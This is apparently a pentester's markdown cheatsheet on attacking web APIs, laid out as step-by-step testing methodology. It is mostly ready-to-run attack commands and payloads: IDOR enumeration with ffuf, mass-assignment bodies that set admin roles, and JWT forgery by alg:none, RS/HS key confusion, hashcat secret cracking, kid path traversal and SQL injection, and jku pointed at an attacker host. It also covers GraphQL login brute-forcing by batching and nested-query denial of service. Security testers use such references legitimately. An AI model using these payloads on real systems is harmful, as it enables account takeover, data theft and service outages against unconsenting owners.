---
tags:
  - hack-notes
  - api
---

# API JWT and GraphQL Cheatsheet

## Table of Contents

- [REST API Testing Approach](#rest-api-testing-approach)
- [OWASP API Top 10](#owasp-api-top-10)
- [BOLA and IDOR](#bola-and-idor)
- [Broken Function Level Authorization](#broken-function-level-authorization)
- [Mass Assignment](#mass-assignment)
- [Excessive Data Exposure](#excessive-data-exposure)
- [Endpoint Discovery](#endpoint-discovery)
- [JWT](#jwt)
- [GraphQL](#graphql)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## REST API Testing Approach

bash

```bash
# 1. Discover  - find the spec, every route, every method, every version
# 2. Map auth  - how tokens are issued, scoped, and validated
# 3. Test BOLA - swap object IDs across accounts (the #1 API bug)
# 4. Test authz- hit privileged routes and methods as a low-priv user
# 5. Abuse data- look for over-returned fields and writable-but-hidden fields

# Always test with TWO accounts (attacker + victim) to prove cross-tenant access
# Note: REST methods matter. Try GET, POST, PUT, PATCH, DELETE on each route.
# Tooling: Burp + Autorize/Auth Analyzer extension to auto-replay as low-priv
```

---

## OWASP API Top 10

bash

```bash
# API1  Broken Object Level Authorization (BOLA/IDOR) - object ID tampering
# API2  Broken Authentication                          - weak tokens, no expiry
# API3  Broken Object Property Level Authorization      - mass assignment + data exposure
# API4  Unrestricted Resource Consumption               - rate/limit, DoS
# API5  Broken Function Level Authorization (BFLA)       - admin routes for users
# API6  Unrestricted Access to Sensitive Business Flows  - automation abuse
# API7  Server Side Request Forgery (SSRF)               - URL params fetched server-side
# API8  Security Misconfiguration                        - verbose errors, CORS, headers
# API9  Improper Inventory Management                    - shadow/old API versions
# API10 Unsafe Consumption of APIs                        - trusting 3rd party data
```

---

## BOLA and IDOR

The single most common and highest-impact API flaw. Authenticated, but the server does not check the object belongs to the caller.

bash

```bash
# Baseline: capture your own request, note the object identifier
GET /api/v1/users/1001/orders HTTP/1.1
Authorization: Bearer <attacker-token>

# Test: change the ID to the victim's object, keep YOUR token
GET /api/v1/users/1002/orders HTTP/1.1
Authorization: Bearer <attacker-token>
# 200 with victim data = BOLA confirmed

# Where IDs hide (not just the URL)
# - path segment        /api/orders/1002
# - query string        /api/orders?id=1002
# - request body         {"order_id":1002}
# - JSON nested field    {"user":{"id":1002}}
# - custom header        X-Account-Id: 1002

# ID formats to try when sequential IDs fail
# UUIDs (leaked elsewhere?), base64, hashids, email, predictable timestamps

# Burp Autorize: log in as victim, then replay attacker session automatically
# Intruder over an ID range to enumerate accessible objects
ffuf -w ids.txt -u https://target/api/users/FUZZ -H "Authorization: Bearer TOKEN" -mc 200
```

---

## Broken Function Level Authorization

bash

```bash
# Privileged ACTION reachable by a low-privilege user (verb/route based)

# 1. Map admin routes (from JS, swagger, docs) then call them as a normal user
GET  /api/admin/users
POST /api/admin/users/1002/promote
DELETE /api/v1/users/1002

# 2. Method tampering - GET allowed, but PUT/DELETE not access-controlled
PUT /api/v1/users/1002 HTTP/1.1   # change another user's record

# 3. Try undocumented/old versions of a guarded route
/api/v2/admin/...   vs   /api/v1/admin/...   vs   /api/internal/...

# 4. HTTP method override headers sometimes bypass method-based controls
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
```

---

## Mass Assignment

bash

```bash
# The API binds JSON straight to the model. Add fields you should not control.

# normal registration body
{"username":"bob","password":"pass"}

# inject privileged or hidden fields
{"username":"bob","password":"pass","role":"admin"}
{"username":"bob","password":"pass","isAdmin":true}
{"username":"bob","password":"pass","verified":true,"balance":999999}

# find candidate fields from a GET response of the same object, then PUT them back
GET /api/users/me   ->   note role, is_admin, group_id
PUT /api/users/me   {"group_id":1,"is_admin":true}

# nested object injection
{"user":{"name":"bob","permissions":["admin"]}}
```

---

## Excessive Data Exposure

bash

```bash
# The endpoint returns full objects and relies on the client to hide fields.

# inspect every response for fields the UI never shows
GET /api/users/1001
# look for: password_hash, ssn, internal_notes, api_key, reset_token, email

# list endpoints often leak more than the detail view
GET /api/users            # may dump all users' PII
GET /api/users?limit=1000

# diff what the UI requests vs what the API returns (Burp + browser side by side)
```

---

## Endpoint Discovery

bash

```bash
# kiterunner - content discovery built for APIs (route + method aware)
kr scan https://target -w routes-large.kite
kr scan https://target -w routes-large.kite -x 20 --fail-status-codes 404,403
kr brute https://target -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# import an OpenAPI/Swagger spec into Burp or Postman to auto-build requests
# common spec locations to probe
/swagger.json   /swagger/v1/swagger.json   /openapi.json   /api-docs
/v2/api-docs    /swagger-ui.html           /graphql        /api/docs

# Burp: extensions -> import OpenAPI spec, generates requests for every route
# Postman: Import -> link to swagger.json -> generates a collection

# mine JS bundles for hidden endpoints and keys
# LinkFinder, or grep the bundles
curl -s https://target/main.js | grep -oE '"/api/[a-zA-Z0-9_/-]+"'
```

---

## JWT

### jwt_tool

bash

```bash
# decode and inspect a token (header, payload, signature)
jwt_tool eyJhbGci...

# run all common attack checks (playbook mode)
jwt_tool eyJhbGci... -M pb

# tamper claims interactively
jwt_tool eyJhbGci... -T

# verify against a known key / pubkey
jwt_tool eyJhbGci... -V -pk public.pem
```

### Decode (manual)

bash

```bash
# header and payload are just base64url-encoded JSON
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
# python one-liner that pads correctly
python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'=='))" eyJ...
```

### alg:none Attack

bash

```bash
# server trusts the header's alg. Set it to none, strip the signature.
# header: {"alg":"none","typ":"JWT"}   payload: {"user":"admin"}   signature: empty
jwt_tool eyJhbGci... -X a
# try variants: none, None, NONE, nOnE (case-sensitivity bypasses)
```

### HS/RS Key Confusion

bash

```bash
# server expects RS256 (asymmetric) but will accept HS256 if you force it.
# sign with the PUBLIC key as the HMAC secret -> forged valid token.
jwt_tool eyJhbGci... -X k -pk public.pem

# manual: change alg to HS256, HMAC the token using the RSA public key as the secret
# grab the public key from /jwks.json, a cert, or recover it from two RS256 tokens
```

### Weak HMAC Secret Cracking

bash

```bash
# hashcat mode 16500 = JWT (HMAC). Feed the whole token.
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# rules for more coverage
hashcat -a 0 -m 16500 token.jwt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john also supports JWT
john token.jwt --wordlist=rockyou.txt --format=HMAC-SHA256

# once cracked, forge any token with the secret
jwt_tool eyJhbGci... -S hs256 -p 'crackedsecret' -T
```

### kid Injection

bash

```bash
# the kid header picks the key file/record. Abuse it for path traversal or SQLi.

# path traversal to a file with known/null content, then sign with that content
# header kid: "../../../../dev/null"  -> key is empty -> sign with empty secret
jwt_tool eyJhbGci... -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# SQLi in kid to return an attacker-controlled key
# kid: "x' UNION SELECT 'attackerkey'-- -"
```

### jku and jwk Header Injection

bash

```bash
# jku: header points at a URL serving the JWKS. Host your own key set.
# header jku: "https://attacker/jwks.json"  -> sign with your private key
jwt_tool eyJhbGci... -I -hc jku -hv "https://attacker/.well-known/jwks.json" -S rs256 -pr private.pem

# look for SSRF/allow-list bypass on jku (trusted-domain prefix, @ tricks)
# jku: "https://trusted.com@attacker/jwks.json"

# jwk: embed the public key directly in the token header (self-signed)
jwt_tool eyJhbGci... -I -hc jwk -S rs256 -pr private.pem  # embeds matching jwk
```

### Expired-Token Replay

bash

```bash
# check whether exp is actually enforced
# 1. capture a token, wait past exp (or edit exp to the past)
# 2. replay it - if accepted, expiry is not validated
jwt_tool eyJhbGci... -T          # edit exp claim, then replay
# also test: nbf (not-before) ignored, no exp claim accepted, long-lived tokens
```

---

## GraphQL

### Introspection Query

bash

```bash
# full schema dump (run against /graphql)
curl -s -X POST https://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery {__schema {types {name fields {name}}}}"}'

# minimal type/field probe when full introspection is filtered
{"query":"{__schema{queryType{name}}}"}
{"query":"{__type(name:\"User\"){name fields{name type{name}}}}"}
```

### Tools

bash

```bash
# graphw00f - fingerprint the GraphQL engine (Apollo, Hasura, graphene, etc.)
graphw00f -d -f -t https://target/graphql

# clairvoyance - reconstruct the schema when introspection is DISABLED (field suggestion)
clairvoyance https://target/graphql -o schema.json -w wordlist.txt

# InQL (Burp extension / CLI) - parse schema, generate queries, fill Repeater
inql -t https://target/graphql

# graphql-cop - quick audit for common misconfigurations
graphql-cop -t https://target/graphql
```

### Batching Attacks

bash

```bash
# send many operations in one HTTP request to bypass rate limits / brute force
# array batching
[{"query":"mutation{login(user:\"a\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"a\",pass:\"2\"){token}}"}]

# alias batching - many aliased calls in a single query
{ a:login(pass:"1"){token} b:login(pass:"2"){token} c:login(pass:"3"){token} }
```

### Field Suggestion

bash

```bash
# even with introspection off, error "Did you mean ...?" leaks valid fields.
# query a wrong field name and read the suggestion in the error
{"query":"{ user { usrname } }"}        # error suggests "username"
# clairvoyance automates this to rebuild the whole schema
```

### DoS via Nested Queries

bash

```bash
# circular relationships let you blow up depth/complexity (no limit set = DoS)
{ user { friends { friends { friends { friends { id } } } } } }

# directive overloading / alias amplification also exhausts resources
# test for: depth limiting, query cost analysis, complexity caps
```

### Authorization Testing

bash

```bash
# GraphQL authz is per-resolver. A guarded query may have an unguarded sibling.
# try reaching an object via a different query/mutation path
{ user(id:1002){ email } }                 # blocked?
{ node(id:"VXNlcjoxMDAy"){ ... on User { email } } }   # via global node id

# BOLA still applies: swap IDs in args with a low-priv token
# mutations often lack the read-side checks - test create/update/delete directly
mutation { updateUser(id:1002, role:"admin"){ id role } }
```

---

## Common Workflows

### Discover Spec to BOLA to JWT to GraphQL

bash

```bash
# 1. Discover the spec and build requests
curl -s https://target/swagger/v1/swagger.json -o spec.json
#    Import spec.json into Burp/Postman; or for GraphQL run introspection
kr scan https://target -w routes-large.kite

# 2. Test BOLA with two accounts - swap object IDs, keep attacker token
GET /api/v1/users/1002/orders   Authorization: Bearer <attacker>
#    Automate with Burp Autorize across the whole sitemap

# 3. Attack the JWT protecting the API
jwt_tool <token> -M pb                      # playbook: alg:none, key confusion, etc.
hashcat -a 0 -m 16500 token.jwt rockyou.txt # crack a weak HMAC secret
#    Forge an elevated token and replay privileged routes

# 4. If GraphQL is present, introspect and abuse
graphw00f -d -f -t https://target/graphql
#    dump schema, test per-resolver authz, batch-brute login, nested-query DoS
```

### Mass Assignment Privilege Escalation

bash

```bash
# 1. GET your own object, note every field returned
GET /api/users/me            # spots role, is_admin, group_id
# 2. PUT/PATCH those fields back with elevated values
PATCH /api/users/me  {"is_admin":true,"role":"admin"}
# 3. Re-fetch to confirm the change stuck
GET /api/users/me
```

---

## Quick Reference

bash

```bash
# discovery
kr scan https://target -w routes-large.kite
/swagger/v1/swagger.json   /openapi.json   /graphql   /v2/api-docs

# bola / idor
GET /api/users/1002/orders   Authorization: Bearer <attacker-token>   # swap ID, keep token
ffuf -w ids.txt -u https://target/api/users/FUZZ -H "Authorization: Bearer T" -mc 200

# mass assignment
{"username":"x","password":"y","role":"admin","isAdmin":true}

# bfla / method tampering
PUT /api/v1/users/1002        X-HTTP-Method-Override: DELETE

# jwt
jwt_tool <token> -M pb                          # run all attacks
jwt_tool <token> -X a                           # alg:none
jwt_tool <token> -X k -pk public.pem            # RS->HS key confusion
hashcat -a 0 -m 16500 token.jwt rockyou.txt     # crack HMAC secret

# graphql
graphw00f -d -f -t https://target/graphql       # fingerprint
clairvoyance https://target/graphql -w wl.txt   # schema when introspection off
{__schema{types{name fields{name}}}}            # introspection
{ a:login(pass:"1"){token} b:login(pass:"2"){token} }   # alias batch brute

# golden rules
# always test with two accounts to prove cross-tenant access
# REST: try every method on every route; GraphQL: authz is per-resolver
```

---

## Related

- Checklists: [API Security](../Checklists/API%20Security.md), [Web Application](../Checklists/Web%20Application.md)
- [Web App and Payloads](Web%20App%20and%20Payloads.md)
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [Nuclei Usage](Nuclei%20Usage.md)
- Indago
- BypassBurrito
